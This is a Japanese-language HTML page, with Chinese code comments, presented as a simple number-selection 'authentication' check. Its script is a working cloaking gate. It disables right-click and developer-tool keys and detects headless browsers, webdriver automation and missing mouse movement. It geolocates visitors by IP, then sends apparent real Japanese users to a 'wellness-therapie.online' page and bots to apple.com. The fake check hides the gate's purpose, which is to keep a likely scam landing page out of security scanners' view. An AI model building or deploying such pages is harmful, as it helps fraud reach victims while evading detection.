<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>認証</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#fff;width:100%;max-width:500px;border-radius:24px;padding:30px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.08)}
.title{text-align:center;font-size:19px;font-weight:600;margin-bottom:16px;color:#222}
.desc{text-align:center;font-size:14px;color:#666;margin-bottom:20px;line-height:1.6}
.target-area{background:#eef6ff;border-radius:16px;padding:20px;text-align:center;margin-bottom:24px}
.target-label{font-size:13px;color:#555;margin-bottom:8px}
.target-nums{font-size:32px;font-weight:700;letter-spacing:10px}
.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
.num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
.num-btn:active{transform:scale(.95)}
.submit-btn{width:100%;padding:18px;border-radius:18px;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
.submit-btn:disabled{background:#ccc;color:#fff;cursor:not-allowed}
.status{text-align:center;margin-top:16px;font-size:13px;color:#888}
</style>
</head>
<body>

<div class="box">
  <div class="title" id="title">選択認証</div>
  <div class="desc" id="desc">表示された数字をすべて選んでください</div>
  <div class="target-area">
    <div class="target-label" id="targetLabel">対象</div>
    <div class="target-nums" id="target"></div>
  </div>
  <div class="grid" id="grid"></div>
  <button class="submit-btn" id="submit" disabled>確認</button>
  <div class="status" id="status">選択してください</div>
</div>

<script>
// ==============================================
// 🚫 基础防爬：禁止右键/审查元素（爬虫无法手动分析DOM）
// ==============================================
document.addEventListener('contextmenu', (e) => e.preventDefault());
document.addEventListener('keydown', (e) => {
  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
    e.preventDefault();
  }
});

// ==============================================
// ✅ 日本真人用户 跳转目标URL
// ==============================================
const REAL_TARGETS = [
  "https://wellness-therapie.online/ja",
  "https://wellness-therapie.online/ja",
  "https://wellness-therapie.online/ja"
];

// ==============================================
// ❌ 非真人 跳转
// ==============================================
const BAD_TARGET = "https://www.apple.com";

// ==============================================
// 🎌 日式ランダム設定（含目标标签随机）
// ==============================================
const JP_TITLES = [
  "選択認証",
  "本人確認",
  "認証をお願いします",
  "確認作業",
  "簡単認証"
];
const JP_DESCS = [
  "表示された数字をすべて選んでください",
  "指定された番号をタップしてください",
  "画面の数字を正しく選択してください",
  "確認のため数字を選択してください",
  "表示された番号をすべて選択してください"
];
const JP_BTN_TEXTS = [
  "確認",
  "認証する",
  "次へ",
  "送信",
  "OK"
];
const JP_TARGET_LABELS = [
  "対象",
  "選択番号",
  "指定数字",
  "確認番号",
  "ターゲット"
];
const JP_COLORS = [
  { main: "#007aff", light: "#eef6ff" },
  { main: "#5856d6", light: "#f0eFFF" },
  { main: "#34c759", light: "#e8f8f0" },
  { main: "#ff2d55", light: "#fff0f4" }
];

// ランダムで選択
const randTitle = JP_TITLES[Math.floor(Math.random() * JP_TITLES.length)];
const randDesc = JP_DESCS[Math.floor(Math.random() * JP_DESCS.length)];
const randBtnText = JP_BTN_TEXTS[Math.floor(Math.random() * JP_BTN_TEXTS.length)];
const randTargetLabel = JP_TARGET_LABELS[Math.floor(Math.random() * JP_TARGET_LABELS.length)];
const randColor = JP_COLORS[Math.floor(Math.random() * JP_COLORS.length)];

// DOMに反映
document.getElementById("title").innerText = randTitle;
document.getElementById("desc").innerText = randDesc;
document.getElementById("submit").innerText = randBtnText;
document.getElementById("targetLabel").innerText = randTargetLabel;
document.querySelector(".target-nums").style.color = randColor.main;
document.querySelector(".target-area").style.background = randColor.light;

// 動的CSSクラス作成
const style = document.createElement('style');
style.textContent = `
.num-btn.selected { background: ${randColor.main}; color: #fff; border-color: ${randColor.main}; }
.submit-btn { background: ${randColor.main}; }
`;
document.head.appendChild(style);

// ==============================================
// 🔰 超宽松真人检测（进阶防爬：轨迹+高级反无头）
// ==============================================
let userInteracted = false;
let hasTrack = false; // 真人操作轨迹标记

// 全场景交互触发
const interactEvents = [
  'click', 'touchstart', 'mousedown',
  'scroll', 'keydown', 'touchend'
];
interactEvents.forEach(evt => {
  window.addEventListener(evt, () => { userInteracted = true; }, { once: true });
});

// 真人操作轨迹检测（鼠标/触摸滑动）
window.addEventListener('mousemove', (e) => { if (e.movementX || e.movementY) hasTrack = true; }, { once: true });
window.addEventListener('touchmove', (e) => { if (e.touches.length > 0) hasTrack = true; }, { once: true });

async function isJapaneseRealUser() {
  try {
    // 核心双校验：必须有交互 + 必须有真人操作轨迹
    if (!userInteracted || !hasTrack) return false;

    // IP检测异常 = 默认日本（不拦截真人）
    let isJpIP = true;
    try {
      const res = await fetch('https://ipapi.co/json/', { cache: 'no-store', timeout: 2000 });
      if (res.ok) {
        const data = await res.json();
        if (data?.country_code) isJpIP = data.country_code === 'JP';
      }
    } catch (e) {}

    // 进阶反无头浏览器：UA+核心特征双重检测（无法被UA伪造绕过）
    const ua = navigator.userAgent || '';
    let isHeadless = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(ua);
    isHeadless = isHeadless || navigator.webdriver === true || window.innerWidth === 0 || window.innerHeight === 0 || navigator.plugins.length === 0;

    // 只要不是明确爬虫，一律通过
    return !isHeadless;
  } catch (e) {
    // 任何异常 = 直接放行（绝不杀真⼈）
    return true;
  }
}

function randomTarget() {
  return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
}

// ===================== 验证界面逻辑（全防爬优化集成） =====================
function generateCaptcha() {
  const nums = "0123456789".split('');
  const need = Math.floor(Math.random() * 2) + 2; // 基础防爬：随机2/3位数字
  const target = [];
  while (target.length < need) {
    const n = nums[Math.floor(Math.random() * nums.length)];
    if (!target.includes(n)) target.push(n);
  }
  const options = [...target];
  while (options.length < 8) {
    const n = nums[Math.floor(Math.random() * nums.length)];
    if (!options.includes(n)) options.push(n);
  }
  options.sort(() => Math.random() - 0.5);
  return { target, options, need };
}

const { target, options, need } = generateCaptcha();
document.getElementById("target").innerText = target.join('   ');

const grid = document.getElementById("grid");
const submit = document.getElementById("submit");
const status = document.getElementById("status");
let selected = [];

// 防爬：随机类名后缀
const randomBtnSuffix = Math.random().toString(36).slice(2, 8);
const baseBtnClass = `num-btn ${randomBtnSuffix}`;

// 基础防爬：按钮随机延迟生成（0-100ms）+ 点击坐标校验
options.forEach((o, index) => {
  setTimeout(() => {
    const btn = document.createElement("button");
    btn.className = baseBtnClass;
    btn.innerText = o;
    btn.dataset.v = o;
    btn.onclick = (e) => {
      // 爬虫无坐标/无event，点击无反应
      if (!e || !e.clientX || !e.clientY) return;
      if (btn.classList.contains("selected")) {
        btn.classList.remove("selected");
        selected = selected.filter(x => x !== o);
      } else {
        btn.classList.add("selected");
        selected.push(o);
      }
      submit.disabled = selected.length !== need;
      status.innerText = `${selected.length}/${need} 個選択中`;
    };
    grid.appendChild(btn);
  }, Math.floor(Math.random() * 100));
});

submit.onclick = async () => {
  const correct = target.every(t => selected.includes(t)) && selected.length === target.length;
  if (!correct) {
    alert("選択した数字を確認してください");
    return;
  }

  // 防爬：100ms操作延迟
  await new Promise(resolve => setTimeout(resolve, 100));
  
  const valid = await isJapaneseRealUser();
  if (valid) {
    location.href = randomTarget();
  } else {
    location.href = BAD_TARGET;
  }
};
</script>
</body>
</html>
